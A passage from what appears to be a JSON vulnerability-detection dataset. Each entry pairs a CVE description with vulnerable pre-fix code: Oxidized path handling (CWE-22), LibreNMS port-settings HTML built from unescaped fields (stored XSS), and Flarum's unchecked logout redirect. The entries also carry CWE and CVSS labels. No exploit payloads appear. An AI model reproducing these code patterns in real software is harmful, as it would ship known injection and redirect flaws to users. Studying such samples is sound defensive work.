          "content": "module Oxidized\n  module API\n    class Mig\n      def initialize(hash_router_db, cloginrc, path_new_router)\n        @hash_router_db = hash_router_db\n        @cloginrc = cloginrc\n        @path_new_router = path_new_router\n      end\n\n      # read cloginrc and return a hash with node name, which a hash value which contains user,\n      # password, eventually enable\n      def cloginrc(clogin_file)\n        close_file = clogin_file\n        file = close_file.read\n        file = file.gsub('add', '')\n\n        hash = {}\n        file.each_line do |line|\n          # stock all device name, and password and enable if there is one\n          line = line.split\n          (0..line.length).each do |i|\n            if line[i] == 'user'\n              # add the equipment and user if not exist\n              hash[line[i + 1]] = { user: line[i + 2] } unless hash[line[i + 1]]\n            # if the equipment exist, add password and enable password\n            elsif line[i] == 'password'\n              if hash[line[i + 1]]\n                if line.length > i + 2\n                  h = hash[line[i + 1]]\n                  h[:password] = line[i + 2]\n                  h[:enable] = line[i + 3] if /\\s*/.match(line[i + 3])\n                  hash[line[i + 1]] = h\n                elsif line.length == i + 2\n                  h = hash[line[i + 1]]\n                  h[:password] = line[i + 2]\n                  hash[line[i + 1]] = h\n                end\n              end\n            end\n          end\n        end\n        close_file.close\n        hash\n      end\n\n      def model_dico(model)\n        dico = { 'cisco' => 'ios', 'foundry' => 'ironware' }\n        model = model.gsub(\"\\n\", '')\n        model = dico[model] if dico[model]\n        model\n      end\n\n      # add node and group for an equipment (take a list of router.db)\n      def rancid_group(router_db_list)\n        model = {}\n        hash = cloginrc @cloginrc\n        router_db_list.each do |router_db|\n          group = router_db[:group]\n          file_close = router_db[:file]\n          file = file_close.read\n          file = file.gsub(':up', '')\n          file.gsub(' ', '')\n\n          file.each_line do |line|\n            line = line.split(':')\n            node = line[0]\n            next unless hash[node]\n\n            h = hash[node]\n            model = model_dico line[1].to_s\n            h[:model] = model\n            h[:group] = group\n          end\n          file_close.close\n        end\n        hash\n      end\n\n      # write a router.db conf, need the hash and the path of the file we whish create\n      def write_router_db(hash)\n        router_db = File.new(@path_new_router, 'w')\n        hash.each do |key, value|\n          line = key.to_s\n          line += \":#{value[:model]}\"\n          line += \":#{value[:user]}\"\n          line += \":#{value[:password]}\"\n          line += \":#{value[:group]}\"\n          line += \":#{value[:enable]}\" if value[:enable]\n          router_db.puts(line)\n        end\n        router_db.close\n      end\n\n      def edit_conf_file(path_conf, router_db_path)\n        file_close = File.open(path_conf, 'r')\n        file = file_close\n        file = file.read\n        source_reached = false\n        new_file = []\n        file.each_line do |line|\n          if source_reached\n            next unless /^\\w/.match(line)\n\n            source_reached = false\n          end\n          new_file.push(line)\n          next unless /source:/.match(line)\n\n          source_reached = true\n          new_file.push(\"  default: csv\\n\")\n          new_file.push(\"  csv:\\n\")\n          new_file.push(\"    file: #{router_db_path}\\n\")\n          new_file.push(\"    delimiter: !ruby/regexp /:/\\n\")\n          new_file.push(\"    map:\\n\")\n          new_file.push(\"      name: 0\\n\")\n          new_file.push(\"      model: 1\\n\")\n          new_file.push(\"      username: 2\\n\")\n          new_file.push(\"      password: 3\\n\")\n          new_file.push(\"      group: 4\\n\")\n          new_file.push(\"    vars_map:\\n\")\n          new_file.push(\"      enable: 5\\n\")\n          next\n        end\n        file_close.close\n\n        new_conf = File.new(path_conf, \"w\")\n        new_file.each do |line|\n          new_conf.puts(line)\n        end\n        new_conf.close\n      end\n\n      def go_rancid_migration\n        hash = rancid_group @hash_router_db\n        write_router_db hash\n        edit_conf_file \"#{Dir.home}/.config/oxidized/config\", @path_new_router\n      end\n    end\n  end\nend\n"
        },
        {
          "name": "lib/oxidized/web/public/scripts/script-migration.js",
          "content": "var number = 1;\n\nfunction add_file_upload(){\n\tnumber++;\n\tdocument.getElementById('number').value = number;\n\tvar table = document.getElementById(\"files\");\n\tvar row = table.insertRow(-1);\n\tvar group = row.insertCell(0);\n\tgroup.id = \"file\";\n\tvar file = row.insertCell(1);\n\tfile.id = \"file\";\n\tgroup.innerHTML = '<input type=\"text\" name=\"group' + number +'\" value=\"default\">';\n\tfile.innerHTML = '<input type=\"file\" name=\"file' + number +'\" required >';\n\t\n}\n"
        }
      ],
      "method_level": [
        "def initialize(hash_router_db, cloginrc, path_new_router)\n        @hash_router_db = hash_router_db\n        @cloginrc = cloginrc\n        @path_new_router = path_new_router\n      end",
        "def cloginrc(clogin_file)\n        close_file = clogin_file\n        file = close_file.read\n        file = file.gsub('add', '')\n\n        hash = {}\n        file.each_line do |line|\n          # stock all device name, and password and enable if there is one\n          line = line.split\n          (0..line.length).each do |i|\n            if line[i] == 'user'\n              # add the equipment and user if not exist\n              hash[line[i + 1]] = { user: line[i + 2] } unless hash[line[i + 1]]\n            # if the equipment exist, add password and enable password\n            elsif line[i] == 'password'\n              if hash[line[i + 1]]\n                if line.length > i + 2\n                  h = hash[line[i + 1]]\n                  h[:password] = line[i + 2]\n                  h[:enable] = line[i + 3] if /\\s*/.match(line[i + 3])\n                  hash[line[i + 1]] = h\n                elsif line.length == i + 2\n                  h = hash[line[i + 1]]\n                  h[:password] = line[i + 2]\n                  hash[line[i + 1]] = h\n                end\n              end\n            end\n          end\n        end\n        close_file.close\n        hash\n      end",
        "def model_dico(model)\n        dico = { 'cisco' => 'ios', 'foundry' => 'ironware' }\n        model = model.gsub(\"\\n\", '')\n        model = dico[model] if dico[model]\n        model\n      end",
        "def rancid_group(router_db_list)\n        model = {}\n        hash = cloginrc @cloginrc\n        router_db_list.each do |router_db|\n          group = router_db[:group]\n          file_close = router_db[:file]\n          file = file_close.read\n          file = file.gsub(':up', '')\n          file.gsub(' ', '')\n\n          file.each_line do |line|\n            line = line.split(':')\n            node = line[0]\n            next unless hash[node]\n\n            h = hash[node]\n            model = model_dico line[1].to_s\n            h[:model] = model\n            h[:group] = group\n          end\n          file_close.close\n        end\n        hash\n      end",
        "def write_router_db(hash)\n        router_db = File.new(@path_new_router, 'w')\n        hash.each do |key, value|\n          line = key.to_s\n          line += \":#{value[:model]}\"\n          line += \":#{value[:user]}\"\n          line += \":#{value[:password]}\"\n          line += \":#{value[:group]}\"\n          line += \":#{value[:enable]}\" if value[:enable]\n          router_db.puts(line)\n        end\n        router_db.close\n      end",
        "def edit_conf_file(path_conf, router_db_path)\n        file_close = File.open(path_conf, 'r')\n        file = file_close\n        file = file.read\n        source_reached = false\n        new_file = []\n        file.each_line do |line|\n          if source_reached\n            next unless /^\\w/.match(line)\n\n            source_reached = false\n          end\n          new_file.push(line)\n          next unless /source:/.match(line)\n\n          source_reached = true\n          new_file.push(\"  default: csv\\n\")\n          new_file.push(\"  csv:\\n\")\n          new_file.push(\"    file: #{router_db_path}\\n\")\n          new_file.push(\"    delimiter: !ruby/regexp /:/\\n\")\n          new_file.push(\"    map:\\n\")\n          new_file.push(\"      name: 0\\n\")\n          new_file.push(\"      model: 1\\n\")\n          new_file.push(\"      username: 2\\n\")\n          new_file.push(\"      password: 3\\n\")\n          new_file.push(\"      group: 4\\n\")\n          new_file.push(\"    vars_map:\\n\")\n          new_file.push(\"      enable: 5\\n\")\n          next\n        end\n        file_close.close\n\n        new_conf = File.new(path_conf, \"w\")\n        new_file.each do |line|\n          new_conf.puts(line)\n        end\n        new_conf.close\n      end",
        "def go_rancid_migration\n        hash = rancid_group @hash_router_db\n        write_router_db hash\n        edit_conf_file \"#{Dir.home}/.config/oxidized/config\", @path_new_router\n      end",
        "function add_file_upload(){\n\tnumber++;\n\tdocument.getElementById('number').value = number;\n\tvar table = document.getElementById(\"files\");\n\tvar row = table.insertRow(-1);\n\tvar group = row.insertCell(0);\n\tgroup.id = \"file\";\n\tvar file = row.insertCell(1);\n\tfile.id = \"file\";\n\tgroup.innerHTML = '<input type=\"text\" name=\"group' + number +'\" value=\"default\">';\n\tfile.innerHTML = '<input type=\"file\" name=\"file' + number +'\" required >';\n\t\n}"
      ],
      "hunk_level": [
        {
          "line_no": 4,
          "content": "      def initialize(hash_router_db, cloginrc, path_new_router)"
        },
        {
          "line_no": 5,
          "content": "        @hash_router_db = hash_router_db"
        },
        {
          "line_no": 6,
          "content": "        @cloginrc = cloginrc"
        },
        {
          "line_no": 7,
          "content": "        @path_new_router = path_new_router"
        },
        {
          "line_no": 8,
          "content": "      end"
        },
        {
          "line_no": 12,
          "content": "      def cloginrc(clogin_file)"
        },
        {
          "line_no": 13,
          "content": "        close_file = clogin_file"
        },
        {
          "line_no": 14,
          "content": "        file = close_file.read"
        },
        {
          "line_no": 15,
          "content": "        file = file.gsub('add', '')"
        },
        {
          "line_no": 17,
          "content": "        hash = {}"
        },
        {
          "line_no": 18,
          "content": "        file.each_line do |line|"
        },
        {
          "line_no": 19,
          "content": "          # stock all device name, and password and enable if there is one"
        },
        {
          "line_no": 20,
          "content": "          line = line.split"
        },
        {
          "line_no": 21,
          "content": "          (0..line.length).each do |i|"
        },
        {
          "line_no": 22,
          "content": "            if line[i] == 'user'"
        },
        {
          "line_no": 23,
          "content": "              # add the equipment and user if not exist"
        },
        {
          "line_no": 24,
          "content": "              hash[line[i + 1]] = { user: line[i + 2] } unless hash[line[i + 1]]"
        },
        {
          "line_no": 25,
          "content": "            # if the equipment exist, add password and enable password"
        },
        {
          "line_no": 26,
          "content": "            elsif line[i] == 'password'"
        },
        {
          "line_no": 27,
          "content": "              if hash[line[i + 1]]"
        },
        {
          "line_no": 28,
          "content": "                if line.length > i + 2"
        },
        {
          "line_no": 29,
          "content": "                  h = hash[line[i + 1]]"
        },
        {
          "line_no": 30,
          "content": "                  h[:password] = line[i + 2]"
        },
        {
          "line_no": 31,
          "content": "                  h[:enable] = line[i + 3] if /\\s*/.match(line[i + 3])"
        },
        {
          "line_no": 32,
          "content": "                  hash[line[i + 1]] = h"
        },
        {
          "line_no": 33,
          "content": "                elsif line.length == i + 2"
        },
        {
          "line_no": 34,
          "content": "                  h = hash[line[i + 1]]"
        },
        {
          "line_no": 35,
          "content": "                  h[:password] = line[i + 2]"
        },
        {
          "line_no": 36,
          "content": "                  hash[line[i + 1]] = h"
        },
        {
          "line_no": 37,
          "content": "                end"
        },
        {
          "line_no": 38,
          "content": "              end"
        },
        {
          "line_no": 39,
          "content": "            end"
        },
        {
          "line_no": 40,
          "content": "          end"
        },
        {
          "line_no": 41,
          "content": "        end"
        },
        {
          "line_no": 42,
          "content": "        close_file.close"
        },
        {
          "line_no": 43,
          "content": "        hash"
        },
        {
          "line_no": 44,
          "content": "      end"
        },
        {
          "line_no": 46,
          "content": "      def model_dico(model)"
        },
        {
          "line_no": 47,
          "content": "        dico = { 'cisco' => 'ios', 'foundry' => 'ironware' }"
        },
        {
          "line_no": 48,
          "content": "        model = model.gsub(\"\\n\", '')"
        },
        {
          "line_no": 49,
          "content": "        model = dico[model] if dico[model]"
        },
        {
          "line_no": 50,
          "content": "        model"
        },
        {
          "line_no": 51,
          "content": "      end"
        },
        {
          "line_no": 54,
          "content": "      def rancid_group(router_db_list)"
        },
        {
          "line_no": 55,
          "content": "        model = {}"
        },
        {
          "line_no": 56,
          "content": "        hash = cloginrc @cloginrc"
        },
        {
          "line_no": 57,
          "content": "        router_db_list.each do |router_db|"
        },
        {
          "line_no": 58,
          "content": "          group = router_db[:group]"
        },
        {
          "line_no": 59,
          "content": "          file_close = router_db[:file]"
        },
        {
          "line_no": 60,
          "content": "          file = file_close.read"
        },
        {
          "line_no": 61,
          "content": "          file = file.gsub(':up', '')"
        },
        {
          "line_no": 62,
          "content": "          file.gsub(' ', '')"
        },
        {
          "line_no": 64,
          "content": "          file.each_line do |line|"
        },
        {
          "line_no": 65,
          "content": "            line = line.split(':')"
        },
        {
          "line_no": 66,
          "content": "            node = line[0]"
        },
        {
          "line_no": 67,
          "content": "            next unless hash[node]"
        },
        {
          "line_no": 69,
          "content": "            h = hash[node]"
        },
        {
          "line_no": 70,
          "content": "            model = model_dico line[1].to_s"
        },
        {
          "line_no": 71,
          "content": "            h[:model] = model"
        },
        {
          "line_no": 72,
          "content": "            h[:group] = group"
        },
        {
          "line_no": 73,
          "content": "          end"
        },
        {
          "line_no": 74,
          "content": "          file_close.close"
        },
        {
          "line_no": 75,
          "content": "        end"
        },
        {
          "line_no": 76,
          "content": "        hash"
        },
        {
          "line_no": 77,
          "content": "      end"
        },
        {
          "line_no": 80,
          "content": "      def write_router_db(hash)"
        },
        {
          "line_no": 81,
          "content": "        router_db = File.new(@path_new_router, 'w')"
        },
        {
          "line_no": 82,
          "content": "        hash.each do |key, value|"
        },
        {
          "line_no": 83,
          "content": "          line = key.to_s"
        },
        {
          "line_no": 84,
          "content": "          line += \":#{value[:model]}\""
        },
        {
          "line_no": 85,
          "content": "          line += \":#{value[:user]}\""
        },
        {
          "line_no": 86,
          "content": "          line += \":#{value[:password]}\""
        },
        {
          "line_no": 87,
          "content": "          line += \":#{value[:group]}\""
        },
        {
          "line_no": 88,
          "content": "          line += \":#{value[:enable]}\" if value[:enable]"
        },
        {
          "line_no": 89,
          "content": "          router_db.puts(line)"
        },
        {
          "line_no": 90,
          "content": "        end"
        },
        {
          "line_no": 91,
          "content": "        router_db.close"
        },
        {
          "line_no": 92,
          "content": "      end"
        },
        {
          "line_no": 94,
          "content": "      def edit_conf_file(path_conf, router_db_path)"
        },
        {
          "line_no": 95,
          "content": "        file_close = File.open(path_conf, 'r')"
        },
        {
          "line_no": 96,
          "content": "        file = file_close"
        },
        {
          "line_no": 97,
          "content": "        file = file.read"
        },
        {
          "line_no": 98,
          "content": "        source_reached = false"
        },
        {
          "line_no": 99,
          "content": "        new_file = []"
        },
        {
          "line_no": 100,
          "content": "        file.each_line do |line|"
        },
        {
          "line_no": 101,
          "content": "          if source_reached"
        },
        {
          "line_no": 102,
          "content": "            next unless /^\\w/.match(line)"
        },
        {
          "line_no": 104,
          "content": "            source_reached = false"
        },
        {
          "line_no": 105,
          "content": "          end"
        },
        {
          "line_no": 106,
          "content": "          new_file.push(line)"
        },
        {
          "line_no": 107,
          "content": "          next unless /source:/.match(line)"
        },
        {
          "line_no": 109,
          "content": "          source_reached = true"
        },
        {
          "line_no": 110,
          "content": "          new_file.push(\"  default: csv\\n\")"
        },
        {
          "line_no": 111,
          "content": "          new_file.push(\"  csv:\\n\")"
        },
        {
          "line_no": 112,
          "content": "          new_file.push(\"    file: #{router_db_path}\\n\")"
        },
        {
          "line_no": 113,
          "content": "          new_file.push(\"    delimiter: !ruby/regexp /:/\\n\")"
        },
        {
          "line_no": 114,
          "content": "          new_file.push(\"    map:\\n\")"
        },
        {
          "line_no": 115,
          "content": "          new_file.push(\"      name: 0\\n\")"
        },
        {
          "line_no": 116,
          "content": "          new_file.push(\"      model: 1\\n\")"
        },
        {
          "line_no": 117,
          "content": "          new_file.push(\"      username: 2\\n\")"
        },
        {
          "line_no": 118,
          "content": "          new_file.push(\"      password: 3\\n\")"
        },
        {
          "line_no": 119,
          "content": "          new_file.push(\"      group: 4\\n\")"
        },
        {
          "line_no": 120,
          "content": "          new_file.push(\"    vars_map:\\n\")"
        },
        {
          "line_no": 121,
          "content": "          new_file.push(\"      enable: 5\\n\")"
        },
        {
          "line_no": 122,
          "content": "          next"
        },
        {
          "line_no": 123,
          "content": "        end"
        },
        {
          "line_no": 124,
          "content": "        file_close.close"
        },
        {
          "line_no": 126,
          "content": "        new_conf = File.new(path_conf, \"w\")"
        },
        {
          "line_no": 127,
          "content": "        new_file.each do |line|"
        },
        {
          "line_no": 128,
          "content": "          new_conf.puts(line)"
        },
        {
          "line_no": 129,
          "content": "        end"
        },
        {
          "line_no": 130,
          "content": "        new_conf.close"
        },
        {
          "line_no": 131,
          "content": "      end"
        },
        {
          "line_no": 133,
          "content": "      def go_rancid_migration"
        },
        {
          "line_no": 134,
          "content": "        hash = rancid_group @hash_router_db"
        },
        {
          "line_no": 135,
          "content": "        write_router_db hash"
        },
        {
          "line_no": 136,
          "content": "        edit_conf_file \"#{Dir.home}/.config/oxidized/config\", @path_new_router"
        },
        {
          "line_no": 137,
          "content": "      end"
        },
        {
          "line_no": 3,
          "content": "function add_file_upload(){"
        },
        {
          "line_no": 4,
          "content": "\tnumber++;"
        },
        {
          "line_no": 5,
          "content": "\tdocument.getElementById('number').value = number;"
        },
        {
          "line_no": 6,
          "content": "\tvar table = document.getElementById(\"files\");"
        },
        {
          "line_no": 7,
          "content": "\tvar row = table.insertRow(-1);"
        },
        {
          "line_no": 8,
          "content": "\tvar group = row.insertCell(0);"
        },
        {
          "line_no": 9,
          "content": "\tgroup.id = \"file\";"
        },
        {
          "line_no": 10,
          "content": "\tvar file = row.insertCell(1);"
        },
        {
          "line_no": 11,
          "content": "\tfile.id = \"file\";"
        },
        {
          "line_no": 12,
          "content": "\tgroup.innerHTML = '<input type=\"text\" name=\"group' + number +'\" value=\"default\">';"
        },
        {
          "line_no": 13,
          "content": "\tfile.innerHTML = '<input type=\"file\" name=\"file' + number +'\" required >';"
        },
        {
          "line_no": 14,
          "content": "\t"
        },
        {
          "line_no": 15,
          "content": "}"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 1293,
    "cve": "CVE-2024-51494",
    "description": "LibreNMS is an open-source, PHP/MySQL/SNMP-based network monitoring system. A Stored Cross-Site Scripting (XSS) vulnerability in the \"Port Settings\" page allows authenticated users to inject arbitrary JavaScript through the \"descr\" parameter when editing a device's port settings. This vulnerability can lead to the execution of malicious code when the \"Port Settings\" page is visited, potentially compromising the user's session and allowing unauthorized actions. This vulnerability is fixed in 24.10.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Http/Controllers/Table/EditPortsController.php",
          "content": "<?php\n/*\n * EditPortsController.php\n *\n * -Description-\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n *\n * @package    LibreNMS\n * @link       http://librenms.org\n * @copyright  2021 Tony Murray\n * @author     Tony Murray <murraytony@gmail.com>\n */\n\nnamespace App\\Http\\Controllers\\Table;\n\nclass EditPortsController extends TableController\n{\n    public function rules()\n    {\n        return [\n            'device_id' => 'required|int',\n            'device_group' => 'nullable|int',\n            'eventtype' => 'nullable|string',\n        ];\n    }\n\n    public function searchFields($request)\n    {\n        return ['ifName', 'ifAlias', 'ifDescr'];\n    }\n\n    protected function sortFields($request)\n    {\n        return ['ifIndex', 'ifName', 'ifAdminStatus', 'ifOperStatus', 'ifSpeed', 'ifAlias'];\n    }\n\n    protected function baseQuery($request)\n    {\n        return \\App\\Models\\Port::where('device_id', $request->get('device_id'))\n            ->with('groups');\n    }\n\n    /**\n     * @param  \\App\\Models\\Port  $port\n     * @return array\n     */\n    public function formatItem($port)\n    {\n        $is_port_bad = $port->ifAdminStatus != 'down' && $port->ifOperStatus != 'up';\n        $do_we_care = ($port->ignore || $port->disabled) ? false : $is_port_bad;\n        $out_of_sync = $do_we_care ? \"class='red'\" : '';\n        $tune = $port->device->getAttrib('ifName_tune:' . $port->ifName) == 'true' ? 'checked' : '';\n\n        $port_group_options = '';\n        foreach ($port->groups as $group) {\n            /** @var \\App\\Models\\PortGroup $group */\n            $port_group_options .= '<option value=\"' . $group->id . '\" selected>' . $group->name . '</option>';\n        }\n\n        return [\n            'ifIndex' => $port->ifIndex,\n            'ifName' => $port->getLabel(),\n            'ifAdminStatus' => $port->ifAdminStatus,\n            'ifOperStatus' => '<span id=\"operstatus_' . $port->port_id . '\" ' . $out_of_sync . '>' . $port->ifOperStatus . '</span>',\n            'disabled' => '<input type=\"checkbox\" class=\"disable-check\" data-size=\"small\" name=\"disabled_' . $port->port_id . '\"' . ($port->disabled ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"olddis_' . $port->port_id . '\" value=\"' . ($port->disabled ? 1 : 0) . '\"\">',\n            'ignore' => '<input type=\"checkbox\" class=\"ignore-check\" data-size=\"small\" name=\"ignore_' . $port->port_id . '\"' . ($port->ignore ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"oldign_' . $port->port_id . '\" value=\"' . ($port->ignore ? 1 : 0) . '\"\">',\n            'port_tune' => '<input type=\"checkbox\" name=\"override_config\" data-attrib=\"ifName_tune:' . $port->ifName . '\" data-device_id=\"' . $port->device_id . '\" data-size=\"small\" ' . $tune . '>',\n            'ifAlias' => '<div class=\"form-group\"><input class=\"form-control input-sm\" name=\"if-alias\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifAlias . '\"><span class=\"form-control-feedback\"><i class=\"fa\" aria-hidden=\"true\"></i></span></div>',\n            'ifSpeed' => '<div class=\"form-group has-feedback\"><input type=\"text\" pattern=\"[0-9]*\" inputmode=\"numeric\" class=\"form-control input-sm\" name=\"if-speed\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifSpeed . '\"><span class=\"form-control-feedback\"><i class=\"fas\" aria-hidden=\"true\"></i></span></div>',\n            'portGroup' => '<div class=\"form-group has-feedback\"><select class=\"input-sm port_group_select\" name=\"port_group_' . $port->port_id . '[]\"  data-port_id=\"' . $port->port_id . '\" multiple>' . $port_group_options . '</select></div>',\n        ];\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function formatItem($port)\n    {\n        $is_port_bad = $port->ifAdminStatus != 'down' && $port->ifOperStatus != 'up';\n        $do_we_care = ($port->ignore || $port->disabled) ? false : $is_port_bad;\n        $out_of_sync = $do_we_care ? \"class='red'\" : '';\n        $tune = $port->device->getAttrib('ifName_tune:' . $port->ifName) == 'true' ? 'checked' : '';\n\n        $port_group_options = '';\n        foreach ($port->groups as $group) {\n            /** @var \\App\\Models\\PortGroup $group */\n            $port_group_options .= '<option value=\"' . $group->id . '\" selected>' . $group->name . '</option>';\n        }\n\n        return [\n            'ifIndex' => $port->ifIndex,\n            'ifName' => $port->getLabel(),\n            'ifAdminStatus' => $port->ifAdminStatus,\n            'ifOperStatus' => '<span id=\"operstatus_' . $port->port_id . '\" ' . $out_of_sync . '>' . $port->ifOperStatus . '</span>',\n            'disabled' => '<input type=\"checkbox\" class=\"disable-check\" data-size=\"small\" name=\"disabled_' . $port->port_id . '\"' . ($port->disabled ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"olddis_' . $port->port_id . '\" value=\"' . ($port->disabled ? 1 : 0) . '\"\">',\n            'ignore' => '<input type=\"checkbox\" class=\"ignore-check\" data-size=\"small\" name=\"ignore_' . $port->port_id . '\"' . ($port->ignore ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"oldign_' . $port->port_id . '\" value=\"' . ($port->ignore ? 1 : 0) . '\"\">',\n            'port_tune' => '<input type=\"checkbox\" name=\"override_config\" data-attrib=\"ifName_tune:' . $port->ifName . '\" data-device_id=\"' . $port->device_id . '\" data-size=\"small\" ' . $tune . '>',\n            'ifAlias' => '<div class=\"form-group\"><input class=\"form-control input-sm\" name=\"if-alias\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifAlias . '\"><span class=\"form-control-feedback\"><i class=\"fa\" aria-hidden=\"true\"></i></span></div>',\n            'ifSpeed' => '<div class=\"form-group has-feedback\"><input type=\"text\" pattern=\"[0-9]*\" inputmode=\"numeric\" class=\"form-control input-sm\" name=\"if-speed\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifSpeed . '\"><span class=\"form-control-feedback\"><i class=\"fas\" aria-hidden=\"true\"></i></span></div>',\n            'portGroup' => '<div class=\"form-group has-feedback\"><select class=\"input-sm port_group_select\" name=\"port_group_' . $port->port_id . '[]\"  data-port_id=\"' . $port->port_id . '\" multiple>' . $port_group_options . '</select></div>',\n        ];\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 69,
          "content": "            $port_group_options .= '<option value=\"' . $group->id . '\" selected>' . $group->name . '</option>';"
        },
        {
          "line_no": 74,
          "content": "            'ifName' => $port->getLabel(),"
        },
        {
          "line_no": 75,
          "content": "            'ifAdminStatus' => $port->ifAdminStatus,"
        },
        {
          "line_no": 76,
          "content": "            'ifOperStatus' => '<span id=\"operstatus_' . $port->port_id . '\" ' . $out_of_sync . '>' . $port->ifOperStatus . '</span>',"
        },
        {
          "line_no": 81,
          "content": "            'port_tune' => '<input type=\"checkbox\" name=\"override_config\" data-attrib=\"ifName_tune:' . $port->ifName . '\" data-device_id=\"' . $port->device_id . '\" data-size=\"small\" ' . $tune . '>',"
        },
        {
          "line_no": 82,
          "content": "            'ifAlias' => '<div class=\"form-group\"><input class=\"form-control input-sm\" name=\"if-alias\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifAlias . '\"><span class=\"form-control-feedback\"><i class=\"fa\" aria-hidden=\"true\"></i></span></div>',"
        },
        {
          "line_no": 83,
          "content": "            'ifSpeed' => '<div class=\"form-group has-feedback\"><input type=\"text\" pattern=\"[0-9]*\" inputmode=\"numeric\" class=\"form-control input-sm\" name=\"if-speed\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifSpeed . '\"><span class=\"form-control-feedback\"><i class=\"fas\" aria-hidden=\"true\"></i></span></div>',"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 3.1
  },
  {
    "id": 25,
    "cve": "CVE-2024-21641",
    "description": "Flarum is open source discussion platform software. Prior to version 1.8.5, the Flarum `/logout` route includes a redirect parameter that allows any third party to redirect users from a (trusted) domain of the Flarum installation to redirect to any link. For logged-in users, the logout must be confirmed. Guests are immediately redirected. This could be used by spammers to redirect to a web address using a trusted domain of a running Flarum installation. The vulnerability has been fixed and published as flarum/core v1.8.5. As a workaround, some extensions modifying the logout route can remedy this issue if their implementation is safe.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Forum/Controller/LogOutController.php",
          "content": "<?php\n\n/*\n * This file is part of Flarum.\n *\n * For detailed copyright and license information, please view the\n * LICENSE file that was distributed with this source code.\n */\n\nnamespace Flarum\\Forum\\Controller;\n\nuse Flarum\\Http\\Exception\\TokenMismatchException;\nuse Flarum\\Http\\Rememberer;\nuse Flarum\\Http\\RequestUtil;\nuse Flarum\\Http\\SessionAuthenticator;\nuse Flarum\\Http\\UrlGenerator;\nuse Flarum\\User\\Event\\LoggedOut;\nuse Illuminate\\Contracts\\Events\\Dispatcher;\nuse Illuminate\\Contracts\\View\\Factory;\nuse Illuminate\\Support\\Arr;\nuse Laminas\\Diactoros\\Response\\HtmlResponse;\nuse Laminas\\Diactoros\\Response\\RedirectResponse;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface as Request;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass LogOutController implements RequestHandlerInterface\n{\n    /**\n     * @var Dispatcher\n     */\n    protected $events;\n\n    /**\n     * @var SessionAuthenticator\n     */\n    protected $authenticator;\n\n    /**\n     * @var Rememberer\n     */\n    protected $rememberer;\n\n    /**\n     * @var Factory\n     */\n    protected $view;\n\n    /**\n     * @var UrlGenerator\n     */\n    protected $url;\n\n    /**\n     * @param Dispatcher $events\n     * @param SessionAuthenticator $authenticator\n     * @param Rememberer $rememberer\n     * @param Factory $view\n     * @param UrlGenerator $url\n     */\n    public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }\n\n    /**\n     * @param Request $request\n     * @return ResponseInterface\n     * @throws TokenMismatchException\n     */\n    public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }",
